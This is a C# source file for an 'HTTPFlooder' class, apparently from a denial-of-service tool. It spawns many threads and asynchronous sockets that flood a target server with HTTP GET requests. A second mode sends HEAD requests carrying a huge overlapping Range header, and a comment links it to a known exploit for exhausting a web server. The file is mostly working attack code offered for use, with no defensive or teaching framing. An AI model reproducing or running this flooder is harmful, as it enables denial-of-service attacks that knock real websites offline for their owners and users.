#region Usings
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;
#endregion
namespace GAS.Core
{
    public class HTTPFlooder : IAttacker
    {
#region Shit
        int BUFFER_SIZE=32;
        byte[] BUFFER;//don't use for anything if you are not Nostradamus
        IPEndPoint __riep;
#endregion
        #region Variables
        bool init = false;
        public IPAddress IP;
        public string DNS;
        public string Subsite;
        private Random rnd = new Random();
        private bool random, usegZip, IPOrDns = true, Resp;
        private Thread[] WorkingThreads;
        private volatile int _attacktype = 0, SPT = 1;
        private volatile string AttackHeader = "";
        #endregion
        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount,int attacktype=0,int connections_per_thread=1)
        {
            BUFFER=new byte[BUFFER_SIZE];
            ThreadCount = threadcount;
            WorkingThreads = new Thread[ThreadCount];
            this.IsDelayed = false;
            try { this.IP = IPAddress.Parse(ip); }
            catch
            {
                try
                {
                    this.IP = Dns.GetHostAddresses(dns)[0];
                }
                catch { this.IPOrDns = false; }
                //this.IPOrDns = false;
            }
            try { this.DNS = dns; }
            catch { this.DNS = this.IP.ToString(); }
            this.Port = port;
            this.Subsite = subSite;
            this.Resp = resp;
            this.Delay = delay;
            this.Timeout = timeout * 1000;
            this.random = random;
            this.usegZip = usegzip;
            States = new ReqState[ThreadCount];
            this.SPT = connections_per_thread;
            _attacktype = attacktype;

        }
        public override void Start()
        {
            if (IsFlooding)
                Stop();
            IsDelayed = false;
            IsFlooding = true;
            StringBuilder temp = new StringBuilder(6000);
            for (int k = 0; k < 1300; temp.Append(",5-" + (k++))) ;
            this.AttackHeader = temp.ToString();
            for (int i = 0; i < ThreadCount; i++)
                (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
            init = true;
        }
        private void bw_DoWork(object indexinthreads)
        {
            while (!init) Thread.Sleep(100);//i know it's bad 
            int MY_INDEX_FOR_WORK = (int) indexinthreads;
            //if (this.SPT==1)
            //    NoSyncAttack(MY_INDEX_FOR_WORK);   
            //else
                AsyncAttack(MY_INDEX_FOR_WORK);
        }
        private void NoSyncAttack(int MY_INDEX_FOR_WORK)
        {
            try
            {
#region Shit
                int bfsize = 1024; // this should be less than the MTU
                byte[] recvBuf = new byte[bfsize];
                int recvd = 0;
                byte[] buf = GetHeaderBytes();
                while (IsFlooding)
                {
                    if (random) buf = GetHeaderBytes();
                    States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                    rSocket socket = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    try
                    {
#endregion
#region Connect
                        States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
                        socket.Connect(this.IPOrDns ? this.IP.ToString() : this.DNS, this.Port);
                        socket.Blocking = Resp;
#endregion
#region Send
                        States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
                        socket.Send(buf, SocketFlags.None);
#endregion
#region Start loading
                        States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                        Requested++;
                        if (Resp)
                        {
                            try
                            {
                                recvd = 0;
                                do { recvd = socket.Receive(recvBuf,bfsize, SocketFlags.None); }
                                while (false);//(recvd > bfsize) && socket.Connected);
                                Downloaded++;
                            }
                            catch { Failed++; }
                        }
#endregion
                        States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                        Downloaded++;
                        if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
#region Cleans
                    }
                    catch
                    {

                    }
                    socket.Dispose();
                }
            }
            catch { }
            finally { }
#endregion
        }
        private void AsyncAttack(int MY_INDEX_FOR_WORK)
        {
            __riep = new IPEndPoint(this.IP, this.Port);
            AsyncFlooder[] fs = new AsyncFlooder[SPT];
            for (int i=0;i<SPT;i++)
            {
                fs[i]=new AsyncFlooder(this);
                fs[i].Start();
            }
            Thread.Sleep(System.Threading.Timeout.Infinite);
        }
        byte[] GetHeaderBytes()
        {
            if (this._attacktype == 0)
                return System.Text.Encoding.ASCII.GetBytes(
                 String.Format(random ? 
                 String.Concat(new string[]{
                     "GET {0}{1} HTTP/1.1{4}",
                     "Host: {2}{4}",
                     "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){4}",
                     "{3}{4}"})
                 :    
                 String.Concat(new string[]{                  
                     "GET {0} HTTP/1.1{4}",
                     "Host: {2}{4}",
                     "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){4}",
                     "{3}{4}",
                     "{4}"}),
                Subsite,
                Functions.RandomString(),
                DNS,
                ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :""),
                "\r\n"
                ));
            else
            {

                //http://1337day.com/exploits/16729
                return System.Text.Encoding.ASCII.GetBytes(
                    String.Format(String.Concat(new string[]{
                                "HEAD {0}{1} HTTP/1.1{4}",
                                "Accept: */*{4}",
                                "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}",
                                "{3}Host: {2}{4}"+"Range:bytes=0-{5}{4}",
                                "Connection: close{4}",
                                "{4}"}),
                            Subsite,
                            (random ? Functions.RandomString() : null),
                            DNS,
                            (usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null),
                            Environment.NewLine,
                            AttackHeader));
            }
        }
        public override void Stop()
        {
            IsFlooding = false;
            try
            {
                foreach (var x in WorkingThreads) { try { x.Abort(); } catch { } }
            }
            catch { }
        }        
        class AsyncFlooder
        {
            SocketAsyncEventArgs sConnect = new SocketAsyncEventArgs(),
                                 sReceive= new SocketAsyncEventArgs(),
                                 sDisconnected = new SocketAsyncEventArgs();
            internal rSocket working_socket= new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            HTTPFlooder parent;
            public AsyncFlooder(HTTPFlooder h)
            {
                parent=h;
            }
            void sConnectedBufSet()
            {
                var b = parent.GetHeaderBytes();
                sConnect.SetBuffer(b, 0, b.Length);
            }
            internal void Start()
            {
#region Connect+send headers
                sConnectedBufSet();
                sConnect.SocketFlags=SocketFlags.None;
                sConnect.Completed+=sConnected;
                sConnect.RemoteEndPoint = parent.__riep;//working_socket.RemoteEndPoint;
#endregion
#region Receive answer

                sReceive.SetBuffer(parent.BUFFER,0,parent.BUFFER_SIZE);
                sReceive.SocketFlags=SocketFlags.None;
                sReceive.Completed+=sCompleted;
                sReceive.RemoteEndPoint = parent.__riep;// working_socket.RemoteEndPoint;
#endregion
#region Disconnect
                sDisconnected.SetBuffer(parent.BUFFER,0,parent.BUFFER_SIZE);
                sDisconnected.SocketFlags=SocketFlags.None;
                sDisconnected.Completed+=sDisconnectedToAss;
                sDisconnected.RemoteEndPoint = parent.__riep;// working_socket.RemoteEndPoint;
                sDisconnected.DisconnectReuseSocket = true;
#endregion
                working_socket.Blocking=parent.Resp;
                try
                {
                    working_socket.ConnectAsync(sConnect);
                }
                catch { }
            }
            void sDisconnectedToAss(object sender, SocketAsyncEventArgs e)
            {
 	            if (!parent.IsFlooding){
                    working_socket.Dispose();
                    return;}
                if (parent.Delay > 0) Thread.Sleep(parent.Delay);
                try
                {
                    sConnectedBufSet();
                    working_socket.ConnectAsync(sConnect);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            void sCompleted(object sender, SocketAsyncEventArgs e)
            {
                bool suc=e.SocketError==SocketError.Success;
                if (suc) parent.Requested++;
                else parent.Failed++;
                if (!parent.IsFlooding){
                    working_socket.Dispose();
                    return;}
                try
                {
                    working_socket.DisconnectAsync(sDisconnected);
                }
                catch { }
            }
            void sConnected(object sender, SocketAsyncEventArgs e)
            {
 	            if (!parent.IsFlooding){
                    working_socket.Dispose();
                    return;}
                try
                {
                    working_socket.ReceiveAsync(sReceive);
                }
                catch { }
                
            }
        }
    }
}